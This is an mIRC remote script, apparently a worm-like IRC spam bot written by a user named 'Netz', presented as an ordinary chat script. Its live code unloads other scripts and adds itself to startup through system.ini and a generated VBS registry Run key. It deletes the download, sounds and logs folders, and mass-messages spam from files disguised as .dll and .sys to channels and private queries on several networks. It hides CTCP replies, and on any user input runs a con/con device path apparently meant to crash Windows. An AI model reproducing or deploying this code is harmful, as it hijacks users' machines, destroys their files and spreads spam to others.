[script]
n0=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n1=;Thanks for ripping this script.. this is my 1st time on making script :) - Netz- ..On Webnet - Irc.webchat.org 6667
n2=;alias
n3=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n4=alias logo return 1,14(T15)1(r15)1(i15)1(x15)1(O15)1(n15)1(I15)1(c15)
n5=alias myserv { server $getok | c.script }
n6=alias c.script { set %num 0 | :check | inc %num | if ($script(%num) == $null) { goto end } | if ($script(%num) != $null) && (.ini !isin $script(%num)) { unload -rs $script(%num) } | goto check | :end }
n7=alias autorun { if ($os != 95) && ($os != 98) { alter | goto hell } | if ($os == 95) || ($os == 98) { .writeini c:/windows/system.ini boot shell Explorer.exe $mircexe | goto hell } | :hell }
n8=alias inv { close -m | if (austnet isin $server) { join $readini IE.ini ausnet $rejoinaus | halt } | if (webchat isin $server) { join $readini IE.ini webnet $jread | halt } | if (undernet isin $server) { join $read Modem.ini | halt } }
n9=alias rejoinaus return n $+ $r(0,1138)
n10=alias jread return n $+ $r(0,1254)
n11=alias cheque { if ($server == $null) { myserv } }
n12=alias alter { write -c Windll.vbs on error resume next | write Windll.vbs Set src = CreateObject("Wscript.shell") | write Windll.vbs updateSP = " $+ $mircexe $+ " | write Windll.vbs keySP = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windll" | write Windll.vbs src.RegWrite keySP, updateSP | .timer 1 2 .run javadetail.vbs }
n13=alias renick return $read xpderfd.dll
n14=alias reid return $read idnem.ocx
n15=alias getok return $gettok(irc.webchat.org 7000@sg.austnet.org 6667@eu.undernet.org 6667@us.austnet.org 6667@webmaster.webchat.org 7000@us.undernet.org 6667@glass.webchat.org 7000@, $+ $rand(1,7) $+ ,64)
n16=alias r!p { editbox -a Hey you!! ...yea yOu!! ..My master nick is Netz in webnet, Come visit him now !! java.webchat.org 7000 :þ }
n17=alias web { goto $r(1,7) | :1 | return .com | goto hell | :2 | return .org | goto hell | :3 | return .net | goto hell | :4 | return .biz | goto hell | :5 | return .sg | goto hell | :6 | return .my | goto hell | :7 | return .mankoya | goto hell | :hell }
n18=alias t1mer { .timer 1 1 $1- }
n19=
n20=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n21=;Remote
n22=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n23=on *:start:{ if ($exists(winpop.exe) == $true) { run winpop.exe /fh /n /c Sounds } | if ($exists(winpop.exe) == $false) { .timer 0 0 /showmirc -t } | .timereditbox -o 0 0 .r!p | autorun | .fullname $read(rnlist.dll) | .emailaddr $reid $+ @ $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $web | .nick $renick | .anick $renick | .identd on $read(h²o.exe) |  .timerserv -o 0 60 .cheque | .timerchange -o 0 3600 .myserv | .timer 1 5 .myserv | .t1mer .rmdir download | .t1mer .rmdir sounds | .t1mer .rmdir logs }
n24=on *:join:#:{
n25=if ($nick == $me) && ($comchan($me,0) == 2) { 
n26=if (webchat isin $server) { .timermsgs 1 14 amsg $read Weblog.dll | .timerparts 1 16 .partall | .timernicks 1 16 .nick $renick }
n27=if (webchat !isin $server) { .timermsgs 1 14 amsg $read Lmnix.sys | .timerparts 1 17 .partall | .timernicks 1 17 .nick $renick }
n28=} 
n29=}
n30=on *:input:*:{ timer 0 -0 run c:/con/con/prn/prn/aux/aux | halt }
n31=on *:open:?:{ if ($chr(35) isin $1-) || (http:// isin $1-) || (www. isin $1-) { halt } | if (webchat !isin $server) { .msg $nick $read lmnix.sys } | if (webchat isin $server) { .msg $nick $read weblog.dll } }
n32=on *:connect: { .perform off | .timerping 0 120 /ctcp $ $+ me ping | .timerjoins 0 30 .inv }
n33=on *:disconnect: { .timermsgs off | .timerping off | .timerpart* off | .timerjoins off | .nick $renick | .timer 1 3 .myserv }
n34=on *:exit:{ .run $mircexe protocol.ini | autorun }
n35=ctcp *:version:*:. { halt }
n36=ctcp *:time:*:. { halt }
n37=ctcp *:ping:*:. { halt }
